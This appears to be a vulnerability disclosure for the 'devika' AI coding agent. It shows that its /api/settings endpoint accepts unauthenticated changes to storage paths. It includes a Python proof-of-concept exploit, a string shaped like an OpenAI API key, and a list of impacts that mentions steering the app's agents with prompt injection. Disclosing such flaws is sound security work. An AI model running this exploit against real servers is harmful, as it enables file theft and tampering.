# Description
`devika` allows remote users to edit settings such as `api keys`, ` custom api endpoints` remotely via `/api/settings` endpoint. Nevertheless, Other than expected and secure settings of `API_ENDPOINTS` or `API_KEYS`. `STORAGE` can also be changed via remote endpoint `/api/settings`; in which contains path settings for `LOGS`, `PROJECTS`. Attackers can utilize this and change these path to arbitrary path on server, resulting unexpected consequences.

 # Proof of Concept

## `/config.toml`

This is how the `config.toml`file looks like in `devika`:

```toml
[STORAGE]
LOGS_DIR = "data/logs"
PDFS_DIR = "data/pdfs"
PROJECTS_DIR = "data/projects"
REPOS_DIR = "data/repos"
SCREENSHOTS_DIR = "data/screenshots"
SQLITE_DB = "data/db/devika.db"

[API_KEYS]
BING = "<YOUR_BING_API_KEY>"
GOOGLE_SEARCH = "<YOUR_GOOGLE_SEARCH_API_KEY>"
GOOGLE_SEARCH_ENGINE_ID = "<YOUR_GOOGLE_SEARCH_ENGINE_ID>"
CLAUDE = ""
OPENAI = ""
GEMINI = "<YOUR_GEMINI_API_KEY>"
MISTRAL = "<YOUR_MISTRAL_API_KEY>"
GROQ = "<YOUR_GROQ_API_KEY>"
NETLIFY = "<YOUR_NETLIFY_API_KEY>"

[API_ENDPOINTS]
BING = "https://api.bing.microsoft.com/v7.0/search"
GOOGLE = "https://www.googleapis.com/customsearch/v1"
OLLAMA = "http://127.0.0.1:8888"

[LOGGING]
LOG_PROMPTS = "false"
LOG_REST_API = "true"
```

As we can see, its consist of

* `[STORAGE]`
* `[API_KEYS]`
* `[API_ENDPOINTS]`
* `[LOGGING]`

`devika` stores all necessary information for the `devika.py` to run in `config.toml`, such as the API-key of varies LLM services or the Endpoints URL for them, additionally, users can also specific their `STORAGE` paths inside of `config.toml`.

> - `SQLITE_DB`: The path to the SQLite database file for storing Devika's data.
> - `SCREENSHOTS_DIR`: The directory where screenshots captured by Devika will be stored.
> - `PDFS_DIR`: The directory where PDF files processed by Devika will be stored.
> - `PROJECTS_DIR`: The directory where Devika's projects will be stored.
> - `LOGS_DIR`: The directory where Devika's logs will be stored.
> - `REPOS_DIR`: The directory where Git repositories cloned by Devika will be stored.

## Source-to-Sink

Endpoint at `devika/devika.py`

```python
@app.route("/api/settings", methods=["POST"])
@route_logger(logger)
def set_settings():
    data = request.json
    print("Data: ", data)
    config.config.update(data)
    config.save_config()
    return jsonify({"message": "Settings updated"})
```

`devika` used `toml` to parse their configuration, received configs will be pass as `data` into  

`config.config.update(data)` and saved by `save_config`:

```python
    def save_config(self):
        with open("config.toml", "w") as f:
            toml.dump(self.config, f)
```

However, as we can see here, no sanitization/check of key is performed in the `/api/settings` endpoint. This means that all posted data are directly parsed into `data` which is furtherly saved; and this lack of sanitization at some point allowed attacker to change configurational path into arbitrary path on the server's file system on running without any authorization checks.

```python
import requests

def exploit(
    url,
    LOGS_DIR,
    PDFS_DIR,
    PROJECTS_DIR,
    REPOS_DIR,
    SCREENSHOTS_DIR,
    SQLITE_DB
):
    url = f"{url}/api/settings"
    json={
    "API_ENDPOINTS": {
        "BING": "https://api.bing.microsoft.com/v7.0/search",
        "GOOGLE": "https://www.googleapis.com/customsearch/v1",
        "OLLAMA": "http://127.0.0.1:8888"
    },
    "API_KEYS": {
        "BING": "<YOUR_BING_API_KEY>",
        "CLAUDE": "12312",
        "GEMINI": "<YOUR_GEMINI_API_KEY>",
        "GOOGLE_SEARCH": "<YOUR_GOOGLE_SEARCH_API_KEY>",
        "GOOGLE_SEARCH_ENGINE_ID": "<YOUR_GOOGLE_SEARCH_ENGINE_ID>",
        "GROQ": "<YOUR_GROQ_API_KEY>",
        "MISTRAL": "<YOUR_MISTRAL_API_KEY>",
        "NETLIFY": "<YOUR_NETLIFY_API_KEY>",
        "OPENAI": "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"
    },
    "LOGGING": {
        "LOG_PROMPTS": "false",
        "LOG_REST_API": "true"
    },
    "STORAGE": {
        "LOGS_DIR": LOGS_DIR,
        "PDFS_DIR": PDFS_DIR,
        "PROJECTS_DIR": PROJECTS_DIR,
        "REPOS_DIR": REPOS_DIR,
        "SCREENSHOTS_DIR": SCREENSHOTS_DIR,
        "SQLITE_DB": SQLITE_DB
    }
    }

    requests.post(url,json=json)
```



## Impacts

* Arbitrary File Leakage: Changing `PDFS_DIR` or  `PROJECTS_DIR` into the father directory of targeted file, use `@project_bp.route("/api/download-project", methods=["GET"])` or `@project_bp.route("/api/download-project-pdf", methods=["GET"])` To fetch files in that directory
* Arbitrary File Write: Internal Agents in `devika` allowed creation of files inside of `PROJECTS_DIR` or generate reports at `PDFS_DIR`. We can apply techniques such as Prompt-Injections to further guides specific output on specific files.
* Availability affections: Changing `SQLITE_DB` can cause `devika.py` to reference other `.db` file, causing malfunctions when operating it.

